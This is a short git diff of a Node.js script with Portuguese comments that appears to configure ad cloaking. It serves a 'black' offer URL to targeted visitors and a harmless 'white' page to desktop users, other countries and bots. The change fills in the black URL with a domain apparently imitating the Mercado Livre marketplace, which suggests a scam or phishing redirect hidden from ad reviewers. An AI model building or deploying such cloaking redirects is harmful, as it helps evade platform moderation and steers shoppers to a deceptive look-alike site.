@@ -2,7 +2,7 @@ const fetch = require('node-fetch');
 
 // --- CONFIGURAÇÕES ---
 // COLOQUE O LINK DA SUA OFERTA REAL (BLACK) ABAIXO:
-const URL_OFERTA_BLACK = 'https://link-da-sua-oferta-aqui.com'; 
+const URL_OFERTA_BLACK = 'https://mercadolivecomdesconto.com/952367148'; 
 
 // URL da Página Segura (Desktop / Outros Países / Bots)
 const URL_PAGINA_WHITE = '/white.html'; 
